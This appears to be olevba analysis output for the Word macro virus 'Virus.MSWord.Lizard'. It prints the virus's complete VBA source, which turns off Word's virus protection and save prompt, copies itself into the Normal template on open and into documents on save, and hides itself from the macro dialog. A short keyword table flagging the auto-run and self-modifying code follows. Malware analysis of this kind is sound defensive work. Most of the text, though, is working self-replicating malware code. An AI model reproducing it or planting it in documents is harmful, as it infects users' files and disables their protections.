olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Lizard
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Lizard - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Lizard.bas 
in file: Virus.MSWord.Lizard - OLE stream: 'Macros/VBA/Lizard'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
Options.SaveNormalPrompt = False
For i = 1 To WordBasic.CountMacros(0, 0)
    If WordBasic.[Macroname$](i, 0) = "Lizard" Then
    MsgBox "a good Lizard is living here     'written by Lord Arz"
    End If
Next i
Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Lizard", wdOrganizerObjectProjectItems
End Sub
Sub FileSaveAs()
Dialogs(wdDialogFileSaveAs).Show
If ActiveDocument.SaveFormat = wdFormatDocument Or ActiveDocument.SaveFormat = wdFormatTemplate Then ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument, "Lizard", wdOrganizerObjectProjectItems
ActiveDocument.Save
End Sub
Sub ToolsMacro()
NormalTemplate.VBProject.VBComponents("Lizard").Export ("Lizard.bas")
Application.OrganizerDelete NormalTemplate.FullName, "Lizard", wdOrganizerObjectProjectItems
While Dialogs(wdDialogToolsMacro).Display
Wend
NormalTemplate.VBProject.VBComponents.import ("Lizard.bas")
Kill "Lizard.bas"
End Sub


Sub ViewVBCode()
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

